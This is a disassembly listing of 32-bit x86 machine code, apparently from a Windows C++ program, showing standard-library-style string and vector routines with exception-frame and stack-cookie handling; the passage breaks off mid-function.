  406c00:	57                   	push   %edi
  406c01:	50                   	push   %eax
  406c02:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406c05:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  406c0b:	8b 45 08             	mov    0x8(%ebp),%eax
  406c0e:	8b f1                	mov    %ecx,%esi
  406c10:	8b 48 40             	mov    0x40(%eax),%ecx
  406c13:	33 ff                	xor    %edi,%edi
  406c15:	89 7d b4             	mov    %edi,-0x4c(%ebp)
  406c18:	f6 c1 02             	test   $0x2,%cl
  406c1b:	75 5a                	jne    0x406c77
  406c1d:	8b 50 24             	mov    0x24(%eax),%edx
  406c20:	39 3a                	cmp    %edi,(%edx)
  406c22:	74 53                	je     0x406c77
  406c24:	8b 12                	mov    (%edx),%edx
  406c26:	8b 48 3c             	mov    0x3c(%eax),%ecx
  406c29:	3b ca                	cmp    %edx,%ecx
  406c2b:	73 02                	jae    0x406c2f
  406c2d:	8b ca                	mov    %edx,%ecx
  406c2f:	8b 40 14             	mov    0x14(%eax),%eax
  406c32:	8b 00                	mov    (%eax),%eax
  406c34:	2b c8                	sub    %eax,%ecx
  406c36:	d1 f9                	sar    $1,%ecx
  406c38:	33 d2                	xor    %edx,%edx
  406c3a:	51                   	push   %ecx
  406c3b:	bb 07 00 00 00       	mov    $0x7,%ebx
  406c40:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  406c43:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  406c46:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  406c49:	66 89 55 d4          	mov    %dx,-0x2c(%ebp)
  406c4d:	e8 be 06 00 00       	call   0x407310
  406c52:	89 7d fc             	mov    %edi,-0x4(%ebp)
  406c55:	89 7e 10             	mov    %edi,0x10(%esi)
  406c58:	33 c0                	xor    %eax,%eax
  406c5a:	89 5e 14             	mov    %ebx,0x14(%esi)
  406c5d:	8d 7d d4             	lea    -0x2c(%ebp),%edi
  406c60:	66 89 06             	mov    %ax,(%esi)
  406c63:	e8 68 fa ff ff       	call   0x4066d0
  406c68:	83 7d e8 08          	cmpl   $0x8,-0x18(%ebp)
  406c6c:	0f 82 85 00 00 00    	jb     0x406cf7
  406c72:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  406c75:	eb 76                	jmp    0x406ced
  406c77:	f6 c1 04             	test   $0x4,%cl
  406c7a:	75 3d                	jne    0x406cb9
  406c7c:	8b 48 20             	mov    0x20(%eax),%ecx
  406c7f:	39 39                	cmp    %edi,(%ecx)
  406c81:	74 36                	je     0x406cb9
  406c83:	8b 09                	mov    (%ecx),%ecx
  406c85:	8b 50 30             	mov    0x30(%eax),%edx
  406c88:	8b 12                	mov    (%edx),%edx
  406c8a:	8d 0c 51             	lea    (%ecx,%edx,2),%ecx
  406c8d:	8b 50 10             	mov    0x10(%eax),%edx
  406c90:	8b 02                	mov    (%edx),%eax
  406c92:	2b c8                	sub    %eax,%ecx
  406c94:	d1 f9                	sar    $1,%ecx
  406c96:	33 d2                	xor    %edx,%edx
  406c98:	51                   	push   %ecx
  406c99:	bb 07 00 00 00       	mov    $0x7,%ebx
  406c9e:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  406ca1:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  406ca4:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  406ca7:	66 89 55 d4          	mov    %dx,-0x2c(%ebp)
  406cab:	e8 60 06 00 00       	call   0x407310
  406cb0:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  406cb7:	eb 9c                	jmp    0x406c55
  406cb9:	bb 07 00 00 00       	mov    $0x7,%ebx
  406cbe:	33 d2                	xor    %edx,%edx
  406cc0:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  406cc3:	89 7d c8             	mov    %edi,-0x38(%ebp)
  406cc6:	66 89 55 b8          	mov    %dx,-0x48(%ebp)
  406cca:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  406cd1:	89 7e 10             	mov    %edi,0x10(%esi)
  406cd4:	33 c0                	xor    %eax,%eax
  406cd6:	89 5e 14             	mov    %ebx,0x14(%esi)
  406cd9:	8d 7d b8             	lea    -0x48(%ebp),%edi
  406cdc:	66 89 06             	mov    %ax,(%esi)
  406cdf:	e8 ec f9 ff ff       	call   0x4066d0
  406ce4:	83 7d cc 08          	cmpl   $0x8,-0x34(%ebp)
  406ce8:	72 0d                	jb     0x406cf7
  406cea:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  406ced:	51                   	push   %ecx
  406cee:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  406cf4:	83 c4 04             	add    $0x4,%esp
  406cf7:	8b c6                	mov    %esi,%eax
  406cf9:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406cfc:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406d03:	59                   	pop    %ecx
  406d04:	5f                   	pop    %edi
  406d05:	5e                   	pop    %esi
  406d06:	5b                   	pop    %ebx
  406d07:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406d0a:	33 cd                	xor    %ebp,%ecx
  406d0c:	e8 6f 14 00 00       	call   0x408180
  406d11:	8b e5                	mov    %ebp,%esp
  406d13:	5d                   	pop    %ebp
  406d14:	c2 04 00             	ret    $0x4
  406d17:	cc                   	int3
  406d18:	cc                   	int3
  406d19:	cc                   	int3
  406d1a:	cc                   	int3
  406d1b:	cc                   	int3
  406d1c:	cc                   	int3
  406d1d:	cc                   	int3
  406d1e:	cc                   	int3
  406d1f:	cc                   	int3
  406d20:	8b 4e 04             	mov    0x4(%esi),%ecx
  406d23:	8b 16                	mov    (%esi),%edx
  406d25:	53                   	push   %ebx
  406d26:	8b d8                	mov    %eax,%ebx
  406d28:	8b c1                	mov    %ecx,%eax
  406d2a:	2b c2                	sub    %edx,%eax
  406d2c:	d1 f8                	sar    $1,%eax
  406d2e:	57                   	push   %edi
  406d2f:	3b c3                	cmp    %ebx,%eax
  406d31:	76 24                	jbe    0x406d57
  406d33:	8d 3c 5a             	lea    (%edx,%ebx,2),%edi
  406d36:	3b f9                	cmp    %ecx,%edi
  406d38:	74 5f                	je     0x406d99
  406d3a:	8b c1                	mov    %ecx,%eax
  406d3c:	2b c1                	sub    %ecx,%eax
  406d3e:	d1 f8                	sar    $1,%eax
  406d40:	8d 1c 00             	lea    (%eax,%eax,1),%ebx
  406d43:	53                   	push   %ebx
  406d44:	51                   	push   %ecx
  406d45:	57                   	push   %edi
  406d46:	ff 15 fc a1 40 00    	call   *0x40a1fc
  406d4c:	83 c4 0c             	add    $0xc,%esp
  406d4f:	03 df                	add    %edi,%ebx
  406d51:	5f                   	pop    %edi
  406d52:	89 5e 04             	mov    %ebx,0x4(%esi)
  406d55:	5b                   	pop    %ebx
  406d56:	c3                   	ret
  406d57:	73 40                	jae    0x406d99
  406d59:	8b cb                	mov    %ebx,%ecx
  406d5b:	2b c8                	sub    %eax,%ecx
  406d5d:	8b c6                	mov    %esi,%eax
  406d5f:	e8 8c 07 00 00       	call   0x4074f0
  406d64:	8b 7e 04             	mov    0x4(%esi),%edi
  406d67:	8b c7                	mov    %edi,%eax
  406d69:	2b 06                	sub    (%esi),%eax
  406d6b:	8b cb                	mov    %ebx,%ecx
  406d6d:	d1 f8                	sar    $1,%eax
  406d6f:	2b c8                	sub    %eax,%ecx
  406d71:	74 15                	je     0x406d88
  406d73:	33 c0                	xor    %eax,%eax
  406d75:	0f b7 d0             	movzwl %ax,%edx
  406d78:	8b c2                	mov    %edx,%eax
  406d7a:	c1 e2 10             	shl    $0x10,%edx
  406d7d:	0b c2                	or     %edx,%eax
  406d7f:	d1 e9                	shr    $1,%ecx
  406d81:	f3 ab                	rep stos %eax,%es:(%edi)
  406d83:	13 c9                	adc    %ecx,%ecx
  406d85:	66 f3 ab             	rep stos %ax,%es:(%edi)
  406d88:	8b 46 04             	mov    0x4(%esi),%eax
  406d8b:	8b c8                	mov    %eax,%ecx
  406d8d:	2b 0e                	sub    (%esi),%ecx
  406d8f:	d1 f9                	sar    $1,%ecx
  406d91:	2b d9                	sub    %ecx,%ebx
  406d93:	8d 14 58             	lea    (%eax,%ebx,2),%edx
  406d96:	89 56 04             	mov    %edx,0x4(%esi)
  406d99:	5f                   	pop    %edi
  406d9a:	5b                   	pop    %ebx
  406d9b:	c3                   	ret
  406d9c:	cc                   	int3
  406d9d:	cc                   	int3
  406d9e:	cc                   	int3
  406d9f:	cc                   	int3
  406da0:	53                   	push   %ebx
  406da1:	8b 19                	mov    (%ecx),%ebx
  406da3:	56                   	push   %esi
  406da4:	8b 71 04             	mov    0x4(%ecx),%esi
  406da7:	2b f3                	sub    %ebx,%esi
  406da9:	b8 93 24 49 92       	mov    $0x92492493,%eax
  406dae:	f7 ee                	imul   %esi
  406db0:	03 d6                	add    %esi,%edx
  406db2:	c1 fa 04             	sar    $0x4,%edx
  406db5:	8b f2                	mov    %edx,%esi
  406db7:	c1 ee 1f             	shr    $0x1f,%esi
  406dba:	03 f2                	add    %edx,%esi
  406dbc:	57                   	push   %edi
  406dbd:	81 fe 48 92 24 09    	cmp    $0x9249248,%esi
  406dc3:	76 0b                	jbe    0x406dd0
  406dc5:	68 c0 a8 40 00       	push   $0x40a8c0
  406dca:	ff 15 38 a1 40 00    	call   *0x40a138
  406dd0:	8b 79 08             	mov    0x8(%ecx),%edi
  406dd3:	2b fb                	sub    %ebx,%edi
  406dd5:	b8 93 24 49 92       	mov    $0x92492493,%eax
  406dda:	f7 ef                	imul   %edi
  406ddc:	03 d7                	add    %edi,%edx
  406dde:	c1 fa 04             	sar    $0x4,%edx
  406de1:	8b c2                	mov    %edx,%eax
  406de3:	c1 e8 1f             	shr    $0x1f,%eax
  406de6:	46                   	inc    %esi
  406de7:	03 c2                	add    %edx,%eax
  406de9:	3b f0                	cmp    %eax,%esi
  406deb:	76 21                	jbe    0x406e0e
  406ded:	8b d0                	mov    %eax,%edx
  406def:	d1 ea                	shr    $1,%edx
  406df1:	bf 49 92 24 09       	mov    $0x9249249,%edi
  406df6:	2b fa                	sub    %edx,%edi
  406df8:	3b f8                	cmp    %eax,%edi
  406dfa:	73 04                	jae    0x406e00
  406dfc:	33 c0                	xor    %eax,%eax
  406dfe:	eb 02                	jmp    0x406e02
  406e00:	03 c2                	add    %edx,%eax
  406e02:	3b c6                	cmp    %esi,%eax
  406e04:	73 02                	jae    0x406e08
  406e06:	8b c6                	mov    %esi,%eax
  406e08:	50                   	push   %eax
  406e09:	e8 42 07 00 00       	call   0x407550
  406e0e:	5f                   	pop    %edi
  406e0f:	5e                   	pop    %esi
  406e10:	5b                   	pop    %ebx
  406e11:	c3                   	ret
  406e12:	cc                   	int3
  406e13:	cc                   	int3
  406e14:	cc                   	int3
  406e15:	cc                   	int3
  406e16:	cc                   	int3
  406e17:	cc                   	int3
  406e18:	cc                   	int3
  406e19:	cc                   	int3
  406e1a:	cc                   	int3
  406e1b:	cc                   	int3
  406e1c:	cc                   	int3
  406e1d:	cc                   	int3
  406e1e:	cc                   	int3
  406e1f:	cc                   	int3
  406e20:	56                   	push   %esi
  406e21:	8b 33                	mov    (%ebx),%esi
  406e23:	85 f6                	test   %esi,%esi
  406e25:	74 42                	je     0x406e69
  406e27:	57                   	push   %edi
  406e28:	8b 7b 04             	mov    0x4(%ebx),%edi
  406e2b:	3b f7                	cmp    %edi,%esi
  406e2d:	74 2d                	je     0x406e5c
  406e2f:	90                   	nop
  406e30:	83 7e 14 08          	cmpl   $0x8,0x14(%esi)
  406e34:	72 0c                	jb     0x406e42
  406e36:	8b 06                	mov    (%esi),%eax
  406e38:	50                   	push   %eax
  406e39:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  406e3f:	83 c4 04             	add    $0x4,%esp
  406e42:	33 c9                	xor    %ecx,%ecx
  406e44:	c7 46 14 07 00 00 00 	movl   $0x7,0x14(%esi)
  406e4b:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  406e52:	66 89 0e             	mov    %cx,(%esi)
  406e55:	83 c6 1c             	add    $0x1c,%esi
  406e58:	3b f7                	cmp    %edi,%esi
  406e5a:	75 d4                	jne    0x406e30
  406e5c:	8b 13                	mov    (%ebx),%edx
  406e5e:	52                   	push   %edx
  406e5f:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  406e65:	83 c4 04             	add    $0x4,%esp
  406e68:	5f                   	pop    %edi
  406e69:	33 c0                	xor    %eax,%eax
  406e6b:	89 03                	mov    %eax,(%ebx)
  406e6d:	89 43 04             	mov    %eax,0x4(%ebx)
  406e70:	89 43 08             	mov    %eax,0x8(%ebx)
  406e73:	5e                   	pop    %esi
  406e74:	c3                   	ret
  406e75:	cc                   	int3
  406e76:	cc                   	int3
  406e77:	cc                   	int3
  406e78:	cc                   	int3
  406e79:	cc                   	int3
  406e7a:	cc                   	int3
  406e7b:	cc                   	int3
  406e7c:	cc                   	int3
  406e7d:	cc                   	int3
  406e7e:	cc                   	int3
  406e7f:	cc                   	int3
  406e80:	55                   	push   %ebp
  406e81:	8b ec                	mov    %esp,%ebp
  406e83:	6a ff                	push   $0xffffffff
  406e85:	68 b8 8b 40 00       	push   $0x408bb8
  406e8a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  406e90:	50                   	push   %eax
  406e91:	56                   	push   %esi
  406e92:	a1 18 e0 40 00       	mov    0x40e018,%eax
  406e97:	33 c5                	xor    %ebp,%eax
  406e99:	50                   	push   %eax
  406e9a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406e9d:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  406ea3:	8b 75 08             	mov    0x8(%ebp),%esi
  406ea6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  406ead:	ff 15 bc a0 40 00    	call   *0x40a0bc
  406eb3:	84 c0                	test   %al,%al
  406eb5:	75 08                	jne    0x406ebf
  406eb7:	8b 0e                	mov    (%esi),%ecx
  406eb9:	ff 15 40 a1 40 00    	call   *0x40a140
  406ebf:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  406ec6:	8b 06                	mov    (%esi),%eax
  406ec8:	8b 08                	mov    (%eax),%ecx
  406eca:	8b 51 04             	mov    0x4(%ecx),%edx
  406ecd:	8b 44 02 38          	mov    0x38(%edx,%eax,1),%eax
  406ed1:	85 c0                	test   %eax,%eax
  406ed3:	74 09                	je     0x406ede
  406ed5:	8b 10                	mov    (%eax),%edx
  406ed7:	8b c8                	mov    %eax,%ecx
  406ed9:	8b 42 08             	mov    0x8(%edx),%eax
  406edc:	ff d0                	call   *%eax
  406ede:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406ee1:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406ee8:	59                   	pop    %ecx
  406ee9:	5e                   	pop    %esi
  406eea:	8b e5                	mov    %ebp,%esp
  406eec:	5d                   	pop    %ebp
  406eed:	c2 04 00             	ret    $0x4
  406ef0:	55                   	push   %ebp
  406ef1:	8b ec                	mov    %esp,%ebp
  406ef3:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406ef6:	53                   	push   %ebx
  406ef7:	8b d8                	mov    %eax,%ebx
  406ef9:	8b 45 08             	mov    0x8(%ebp),%eax
  406efc:	8b 40 10             	mov    0x10(%eax),%eax
  406eff:	3b c1                	cmp    %ecx,%eax
  406f01:	73 0b                	jae    0x406f0e
  406f03:	68 a8 a8 40 00       	push   $0x40a8a8
  406f08:	ff 15 30 a1 40 00    	call   *0x40a130
  406f0e:	2b c1                	sub    %ecx,%eax
  406f10:	3b c3                	cmp    %ebx,%eax
  406f12:	73 02                	jae    0x406f16
  406f14:	8b d8                	mov    %eax,%ebx
  406f16:	8b 47 10             	mov    0x10(%edi),%eax
  406f19:	83 c9 ff             	or     $0xffffffff,%ecx
  406f1c:	2b c8                	sub    %eax,%ecx
  406f1e:	3b cb                	cmp    %ebx,%ecx
  406f20:	77 0b                	ja     0x406f2d
  406f22:	68 98 a8 40 00       	push   $0x40a898
  406f27:	ff 15 38 a1 40 00    	call   *0x40a138
  406f2d:	85 db                	test   %ebx,%ebx
  406f2f:	74 5a                	je     0x406f8b
  406f31:	56                   	push   %esi
  406f32:	8d 34 18             	lea    (%eax,%ebx,1),%esi
  406f35:	8b c7                	mov    %edi,%eax
  406f37:	e8 14 02 00 00       	call   0x407150
  406f3c:	84 c0                	test   %al,%al
  406f3e:	74 4a                	je     0x406f8a
  406f40:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406f43:	b8 10 00 00 00       	mov    $0x10,%eax
  406f48:	39 41 14             	cmp    %eax,0x14(%ecx)
  406f4b:	72 02                	jb     0x406f4f
  406f4d:	8b 09                	mov    (%ecx),%ecx
  406f4f:	39 47 14             	cmp    %eax,0x14(%edi)
  406f52:	72 04                	jb     0x406f58
  406f54:	8b 07                	mov    (%edi),%eax
  406f56:	eb 02                	jmp    0x406f5a
  406f58:	8b c7                	mov    %edi,%eax
  406f5a:	03 4d 0c             	add    0xc(%ebp),%ecx
  406f5d:	53                   	push   %ebx
  406f5e:	51                   	push   %ecx
  406f5f:	8b 4f 10             	mov    0x10(%edi),%ecx
  406f62:	03 c8                	add    %eax,%ecx
  406f64:	51                   	push   %ecx
  406f65:	e8 c8 1b 00 00       	call   0x408b32
  406f6a:	83 c4 0c             	add    $0xc,%esp
  406f6d:	83 7f 14 10          	cmpl   $0x10,0x14(%edi)
  406f71:	89 77 10             	mov    %esi,0x10(%edi)
  406f74:	72 0e                	jb     0x406f84
  406f76:	8b 07                	mov    (%edi),%eax
  406f78:	c6 04 30 00          	movb   $0x0,(%eax,%esi,1)
  406f7c:	5e                   	pop    %esi
  406f7d:	8b c7                	mov    %edi,%eax
  406f7f:	5b                   	pop    %ebx
  406f80:	5d                   	pop    %ebp
  406f81:	c2 08 00             	ret    $0x8
  406f84:	8b c7                	mov    %edi,%eax
  406f86:	c6 04 30 00          	movb   $0x0,(%eax,%esi,1)
  406f8a:	5e                   	pop    %esi
  406f8b:	8b c7                	mov    %edi,%eax
  406f8d:	5b                   	pop    %ebx
  406f8e:	5d                   	pop    %ebp
  406f8f:	c2 08 00             	ret    $0x8
  406f92:	cc                   	int3
  406f93:	cc                   	int3
  406f94:	cc                   	int3
  406f95:	cc                   	int3
  406f96:	cc                   	int3
  406f97:	cc                   	int3
  406f98:	cc                   	int3
  406f99:	cc                   	int3
  406f9a:	cc                   	int3
  406f9b:	cc                   	int3
  406f9c:	cc                   	int3
  406f9d:	cc                   	int3
  406f9e:	cc                   	int3
  406f9f:	cc                   	int3
  406fa0:	55                   	push   %ebp
  406fa1:	8b ec                	mov    %esp,%ebp
  406fa3:	53                   	push   %ebx
  406fa4:	8b d8                	mov    %eax,%ebx
  406fa6:	57                   	push   %edi
  406fa7:	8b f9                	mov    %ecx,%edi
  406fa9:	85 db                	test   %ebx,%ebx
  406fab:	74 53                	je     0x407000
  406fad:	8b 4f 14             	mov    0x14(%edi),%ecx
  406fb0:	83 f9 10             	cmp    $0x10,%ecx
  406fb3:	72 04                	jb     0x406fb9
  406fb5:	8b 07                	mov    (%edi),%eax
  406fb7:	eb 02                	jmp    0x406fbb
  406fb9:	8b c7                	mov    %edi,%eax
  406fbb:	3b d8                	cmp    %eax,%ebx
  406fbd:	72 41                	jb     0x407000
  406fbf:	83 f9 10             	cmp    $0x10,%ecx
  406fc2:	72 04                	jb     0x406fc8
  406fc4:	8b 07                	mov    (%edi),%eax
  406fc6:	eb 02                	jmp    0x406fca
  406fc8:	8b c7                	mov    %edi,%eax
  406fca:	8b 57 10             	mov    0x10(%edi),%edx
  406fcd:	03 d0                	add    %eax,%edx
  406fcf:	3b d3                	cmp    %ebx,%edx
  406fd1:	76 2d                	jbe    0x407000
  406fd3:	83 f9 10             	cmp    $0x10,%ecx
  406fd6:	72 14                	jb     0x406fec
  406fd8:	8b 07                	mov    (%edi),%eax
  406fda:	2b d8                	sub    %eax,%ebx
  406fdc:	8b 45 08             	mov    0x8(%ebp),%eax
  406fdf:	53                   	push   %ebx
  406fe0:	57                   	push   %edi
  406fe1:	e8 0a ff ff ff       	call   0x406ef0
  406fe6:	5f                   	pop    %edi
  406fe7:	5b                   	pop    %ebx
  406fe8:	5d                   	pop    %ebp
  406fe9:	c2 04 00             	ret    $0x4
  406fec:	8b c7                	mov    %edi,%eax
  406fee:	2b d8                	sub    %eax,%ebx
  406ff0:	8b 45 08             	mov    0x8(%ebp),%eax
  406ff3:	53                   	push   %ebx
  406ff4:	57                   	push   %edi
  406ff5:	e8 f6 fe ff ff       	call   0x406ef0
  406ffa:	5f                   	pop    %edi
  406ffb:	5b                   	pop    %ebx
  406ffc:	5d                   	pop    %ebp
  406ffd:	c2 04 00             	ret    $0x4
  407000:	8b 45 08             	mov    0x8(%ebp),%eax
  407003:	56                   	push   %esi
  407004:	8b 77 10             	mov    0x10(%edi),%esi
  407007:	83 c9 ff             	or     $0xffffffff,%ecx
  40700a:	2b ce                	sub    %esi,%ecx
  40700c:	3b c8                	cmp    %eax,%ecx
  40700e:	77 0b                	ja     0x40701b
  407010:	68 98 a8 40 00       	push   $0x40a898
  407015:	ff 15 38 a1 40 00    	call   *0x40a138
  40701b:	85 c0                	test   %eax,%eax
  40701d:	74 4a                	je     0x407069
  40701f:	03 f0                	add    %eax,%esi
  407021:	8b c7                	mov    %edi,%eax
  407023:	e8 28 01 00 00       	call   0x407150
  407028:	84 c0                	test   %al,%al
  40702a:	74 3d                	je     0x407069
  40702c:	83 7f 14 10          	cmpl   $0x10,0x14(%edi)
  407030:	72 04                	jb     0x407036
  407032:	8b 07                	mov    (%edi),%eax
  407034:	eb 02                	jmp    0x407038
  407036:	8b c7                	mov    %edi,%eax
  407038:	8b 55 08             	mov    0x8(%ebp),%edx
  40703b:	8b 4f 10             	mov    0x10(%edi),%ecx
  40703e:	52                   	push   %edx
  40703f:	03 c8                	add    %eax,%ecx
  407041:	53                   	push   %ebx
  407042:	51                   	push   %ecx
  407043:	e8 ea 1a 00 00       	call   0x408b32
  407048:	83 c4 0c             	add    $0xc,%esp
  40704b:	83 7f 14 10          	cmpl   $0x10,0x14(%edi)
  40704f:	89 77 10             	mov    %esi,0x10(%edi)
  407052:	72 0f                	jb     0x407063
  407054:	8b 07                	mov    (%edi),%eax
  407056:	c6 04 30 00          	movb   $0x0,(%eax,%esi,1)
  40705a:	5e                   	pop    %esi
  40705b:	8b c7                	mov    %edi,%eax
  40705d:	5f                   	pop    %edi
  40705e:	5b                   	pop    %ebx
  40705f:	5d                   	pop    %ebp
  407060:	c2 04 00             	ret    $0x4
  407063:	8b c7                	mov    %edi,%eax
  407065:	c6 04 30 00          	movb   $0x0,(%eax,%esi,1)
  407069:	5e                   	pop    %esi
  40706a:	8b c7                	mov    %edi,%eax
  40706c:	5f                   	pop    %edi
  40706d:	5b                   	pop    %ebx
  40706e:	5d                   	pop    %ebp
  40706f:	c2 04 00             	ret    $0x4
  407072:	cc                   	int3
  407073:	cc                   	int3
  407074:	cc                   	int3
  407075:	cc                   	int3
  407076:	cc                   	int3
  407077:	cc                   	int3
  407078:	cc                   	int3
  407079:	cc                   	int3
  40707a:	cc                   	int3
  40707b:	cc                   	int3
  40707c:	cc                   	int3
  40707d:	cc                   	int3
  40707e:	cc                   	int3
  40707f:	cc                   	int3
  407080:	53                   	push   %ebx
  407081:	8b d8                	mov    %eax,%ebx
  407083:	85 db                	test   %ebx,%ebx
  407085:	74 4b                	je     0x4070d2
  407087:	8b 4e 14             	mov    0x14(%esi),%ecx
  40708a:	83 f9 10             	cmp    $0x10,%ecx
  40708d:	72 04                	jb     0x407093
  40708f:	8b 06                	mov    (%esi),%eax
  407091:	eb 02                	jmp    0x407095
  407093:	8b c6                	mov    %esi,%eax
  407095:	3b d8                	cmp    %eax,%ebx
  407097:	72 39                	jb     0x4070d2
  407099:	83 f9 10             	cmp    $0x10,%ecx
  40709c:	72 04                	jb     0x4070a2
  40709e:	8b 06                	mov    (%esi),%eax
  4070a0:	eb 02                	jmp    0x4070a4
  4070a2:	8b c6                	mov    %esi,%eax
  4070a4:	8b 56 10             	mov    0x10(%esi),%edx
  4070a7:	03 d0                	add    %eax,%edx
  4070a9:	3b d3                	cmp    %ebx,%edx
  4070ab:	76 25                	jbe    0x4070d2
  4070ad:	83 f9 10             	cmp    $0x10,%ecx
  4070b0:	72 10                	jb     0x4070c2
  4070b2:	8b 06                	mov    (%esi),%eax
  4070b4:	2b d8                	sub    %eax,%ebx
  4070b6:	56                   	push   %esi
  4070b7:	8b c7                	mov    %edi,%eax
  4070b9:	8b ce                	mov    %esi,%ecx
  4070bb:	e8 d0 f1 ff ff       	call   0x406290
  4070c0:	5b                   	pop    %ebx
  4070c1:	c3                   	ret
  4070c2:	8b c6                	mov    %esi,%eax
  4070c4:	2b d8                	sub    %eax,%ebx
  4070c6:	56                   	push   %esi
  4070c7:	8b c7                	mov    %edi,%eax
  4070c9:	8b ce                	mov    %esi,%ecx
  4070cb:	e8 c0 f1 ff ff       	call   0x406290
  4070d0:	5b                   	pop    %ebx
  4070d1:	c3                   	ret
  4070d2:	83 ff fe             	cmp    $0xfffffffe,%edi
  4070d5:	76 0b                	jbe    0x4070e2
  4070d7:	68 98 a8 40 00       	push   $0x40a898
  4070dc:	ff 15 38 a1 40 00    	call   *0x40a138
  4070e2:	8b 46 14             	mov    0x14(%esi),%eax
  4070e5:	3b c7                	cmp    %edi,%eax
  4070e7:	73 19                	jae    0x407102
  4070e9:	8b 46 10             	mov    0x10(%esi),%eax
  4070ec:	50                   	push   %eax
  4070ed:	57                   	push   %edi
  4070ee:	56                   	push   %esi
  4070ef:	e8 cc 05 00 00       	call   0x4076c0
  4070f4:	85 ff                	test   %edi,%edi
  4070f6:	74 4c                	je     0x407144
  4070f8:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  4070fc:	72 20                	jb     0x40711e
  4070fe:	8b 06                	mov    (%esi),%eax
  407100:	eb 1e                	jmp    0x407120
  407102:	85 ff                	test   %edi,%edi
  407104:	75 f2                	jne    0x4070f8
  407106:	89 7e 10             	mov    %edi,0x10(%esi)
  407109:	83 f8 10             	cmp    $0x10,%eax
  40710c:	72 09                	jb     0x407117
  40710e:	8b 06                	mov    (%esi),%eax
  407110:	c6 00 00             	movb   $0x0,(%eax)
  407113:	8b c6                	mov    %esi,%eax
  407115:	5b                   	pop    %ebx
  407116:	c3                   	ret
  407117:	8b c6                	mov    %esi,%eax
  407119:	c6 00 00             	movb   $0x0,(%eax)
  40711c:	5b                   	pop    %ebx
  40711d:	c3                   	ret
  40711e:	8b c6                	mov    %esi,%eax
  407120:	57                   	push   %edi
  407121:	53                   	push   %ebx
  407122:	50                   	push   %eax
  407123:	e8 0a 1a 00 00       	call   0x408b32
  407128:	83 c4 0c             	add    $0xc,%esp
  40712b:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  40712f:	89 7e 10             	mov    %edi,0x10(%esi)
  407132:	72 0a                	jb     0x40713e
  407134:	8b 06                	mov    (%esi),%eax
  407136:	c6 04 38 00          	movb   $0x0,(%eax,%edi,1)
  40713a:	8b c6                	mov    %esi,%eax
  40713c:	5b                   	pop    %ebx
  40713d:	c3                   	ret
  40713e:	8b c6                	mov    %esi,%eax
  407140:	c6 04 38 00          	movb   $0x0,(%eax,%edi,1)
  407144:	8b c6                	mov    %esi,%eax
  407146:	5b                   	pop    %ebx
  407147:	c3                   	ret
  407148:	cc                   	int3
  407149:	cc                   	int3
  40714a:	cc                   	int3
  40714b:	cc                   	int3
  40714c:	cc                   	int3
  40714d:	cc                   	int3
  40714e:	cc                   	int3
  40714f:	cc                   	int3
  407150:	83 fe fe             	cmp    $0xfffffffe,%esi
  407153:	76 0b                	jbe    0x407160
  407155:	68 98 a8 40 00       	push   $0x40a898
  40715a:	ff 15 38 a1 40 00    	call   *0x40a138
  407160:	8b 48 14             	mov    0x14(%eax),%ecx
  407163:	3b ce                	cmp    %esi,%ecx
  407165:	73 14                	jae    0x40717b
  407167:	8b 48 10             	mov    0x10(%eax),%ecx
  40716a:	51                   	push   %ecx
  40716b:	56                   	push   %esi
  40716c:	50                   	push   %eax
  40716d:	e8 4e 05 00 00       	call   0x4076c0
  407172:	33 d2                	xor    %edx,%edx
  407174:	3b d6                	cmp    %esi,%edx
  407176:	1b c0                	sbb    %eax,%eax
  407178:	f7 d8                	neg    %eax
  40717a:	c3                   	ret
  40717b:	85 f6                	test   %esi,%esi
  40717d:	75 0d                	jne    0x40718c
  40717f:	89 70 10             	mov    %esi,0x10(%eax)
  407182:	83 f9 10             	cmp    $0x10,%ecx
  407185:	72 02                	jb     0x407189
  407187:	8b 00                	mov    (%eax),%eax
  407189:	c6 00 00             	movb   $0x0,(%eax)
  40718c:	33 d2                	xor    %edx,%edx
  40718e:	3b d6                	cmp    %esi,%edx
  407190:	1b c0                	sbb    %eax,%eax
  407192:	f7 d8                	neg    %eax
  407194:	c3                   	ret
  407195:	cc                   	int3
  407196:	cc                   	int3
  407197:	cc                   	int3
  407198:	cc                   	int3
  407199:	cc                   	int3
  40719a:	cc                   	int3
  40719b:	cc                   	int3
  40719c:	cc                   	int3
  40719d:	cc                   	int3
  40719e:	cc                   	int3
  40719f:	cc                   	int3
  4071a0:	55                   	push   %ebp
  4071a1:	8b ec                	mov    %esp,%ebp
  4071a3:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4071a6:	53                   	push   %ebx
  4071a7:	8b d8                	mov    %eax,%ebx
  4071a9:	8b 45 08             	mov    0x8(%ebp),%eax
  4071ac:	8b 40 10             	mov    0x10(%eax),%eax
  4071af:	3b c1                	cmp    %ecx,%eax
  4071b1:	73 0b                	jae    0x4071be
